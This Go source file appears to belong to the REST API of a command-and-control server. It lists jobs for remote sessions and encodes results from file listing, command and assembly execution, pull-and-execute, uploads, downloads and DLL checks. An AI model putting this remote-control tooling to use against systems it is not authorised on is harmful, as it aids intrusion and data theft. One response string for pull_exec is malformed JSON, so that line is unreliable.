package rest

import (
	"context"
	"encoding/base64"
	"net/http"
	"strconv"
	"time"

	"github.com/PurpleSec/escape"
	"github.com/PurpleSec/routex"
	"github.com/iDigitalFlame/xmt/c2"
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/c2/task/wintask"
	"github.com/iDigitalFlame/xmt/data"
)

func (s *Server) httpJobList(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	x := s.cache.device(r.Values.StringDefault("session", ""))
	if x == nil {
		errors(http.StatusNotFound, "", w, r)
		return
	}
	j := x.Jobs()
	if s.cache.jobLock.RLock(); len(j) == 0 && len(s.cache.job) == 0 {
		s.cache.jobLock.RUnlock()
		w.Write([]byte(`{}`))
		return
	}
	if l, ok := s.cache.job[x.ID]; ok && len(l) > 0 {
	addloop:
		for k, v := range l {
			for i := range j {
				if j[i].ID == k {
					continue addloop
				}
			}
			j = append(j, v)
		}
	}
	s.cache.jobLock.RUnlock()
	w.Write([]byte("{"))
	for i := range j {
		if i > 0 {
			w.Write([]byte(","))
		}
		w.Write([]byte(`"` + strconv.FormatUint(uint64(j[i].ID), 10) + `":`))
		j[i].JSON(w)
	}
	w.Write([]byte("}"))
}
func (s *Server) httpJobResultGet(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	i := r.Values.UintDefault("job", 0)
	if i == 0 || i > data.LimitMedium {
		errors(http.StatusBadRequest, "invalid JobID value", w, r)
		return
	}
	j := s.cache.retrive(r.Values.StringDefault("session", ""), uint16(i), false)
	if j == nil {
		errors(http.StatusNotFound, "", w, r)
		return
	}
	switch {
	case j.Status == c2.StatusError:
		errors(http.StatusPartialContent, j.Error, w, r)
		return
	case j.Status < c2.StatusCompleted:
		errors(http.StatusTooEarly, "job has not completed", w, r)
		return
	case j.Result == nil || j.Result.Empty():
		w.WriteHeader(http.StatusNoContent)
		return
	}
	switch w.WriteHeader(http.StatusOK); j.Type {
	case task.MvCwd:
		w.Write([]byte(`{"type":"cd"}`))
		return
	case task.MvList:
		w.Write([]byte(`{"type":"list","entries":[`))
		v, _ := j.Result.Uint32()
		if v == 0 {
			w.Write([]byte("]}"))
			return
		}
		for x := uint32(0); x < v; x++ {
			if x > 0 {
				w.Write([]byte(","))
			}
			var (
				p, _ = j.Result.StringVal()
				m, _ = j.Result.Uint32()
				b, _ = j.Result.Uint64()
				t, _ = j.Result.Int64()
			)
			w.Write([]byte(
				`{"name":` + escape.JSON(p) + `,"mode":` + strconv.FormatUint(uint64(m), 10) +
					`,"size":` + strconv.FormatUint(b, 10) + `,"modtime":` + escape.JSON(time.Unix(t, 0).Format(time.RFC3339)) + `}`,
			))
		}
		w.Write([]byte("]}"))
		return
	case task.TvAssembly:
		var (
			h, _ = j.Result.Uint64()
			p, _ = j.Result.Uint32()
			c, _ = j.Result.Uint32()
		)
		w.Write([]byte(
			`{"type":"assembly","handle":` + strconv.FormatUint(h, 10) + `,"exit":` +
				strconv.FormatUint(uint64(c), 10) + `,"pid":` + strconv.FormatUint(uint64(p), 10) + `}`,
		))
		return
	case task.TvPullExecute:
		var (
			p, _ = j.Result.Uint32()
			c, _ = j.Result.Uint32()
		)
		w.Write([]byte(
			`{"type":pull_exec", "pid":` + strconv.FormatUint(uint64(p), 10) + `,"exit":` + strconv.Itoa(int(c)) + `}`,
		))
		return
	case wintask.WvCheckDLL:
		v, _ := j.Result.Bool()
		if v {
			w.Write([]byte(`{"type":"check_dll","tainted":false}`))
		} else {
			w.Write([]byte(`{"type":"check_dll","tainted":true}`))
		}
		return
	case wintask.WvReloadDLL:
		w.Write([]byte(`{"type":"reload_dll"}`))
		return
	}
	o := base64.NewEncoder(base64.StdEncoding, w)
	switch w.Write([]byte(`{"type":"`)); j.Type {
	case task.MvPwd:
		w.Write([]byte(`pwd", "data":"`))
		n, _ := j.Result.Bytes()
		o.Write(n)
	case task.TvUpload, task.TvPull:
		var (
			n, _ = j.Result.Bytes()
			v, _ = j.Result.Uint64()
		)
		w.Write([]byte(`upload","size":` + strconv.FormatUint(v, 10) + `,"data":"`))
		o.Write(n)
	case task.TvExecute:
		var (
			p, _ = j.Result.Uint32()
			c, _ = j.Result.Uint32()
		)
		w.Write(
			[]byte(`execute", "pid":` + strconv.FormatUint(uint64(p), 10) + `,"exit":` +
				strconv.Itoa(int(c)) + `,"data":"`),
		)
		o.Write(j.Result.Payload())
	case task.TvDownload:
		var (
			n, _ = j.Result.StringVal()
			d, _ = j.Result.Bool()
			v, _ = j.Result.Uint64()
		)
		w.Write([]byte(
			`download","path":` + escape.JSON(n) + `,"size":` + strconv.FormatUint(v, 10) +
				`,"dir":` + strconv.FormatBool(d) + `,"data":"`,
		))
		fallthrough
	default:
		o.Write(j.Result.Payload())
	}
	j.Result.Seek(0, 0)
	o.Close()
	w.Write([]byte(`"}`))
}
func (s *Server) httpJobGetDelete(_ context.Context, w http.ResponseWriter, r *routex.Request) {
	i := r.Values.UintDefault("job", 0)
	if i == 0 || i > data.LimitMedium {
		errors(http.StatusBadRequest, "invalid jobID value", w, r)
		return
	}
	if j := s.cache.retrive(r.Values.StringDefault("session", ""), uint16(i), r.IsDelete()); j != nil {
		routex.JSON(w, http.StatusOK, j)
		return
	}
	errors(http.StatusNotFound, "", w, r)
}
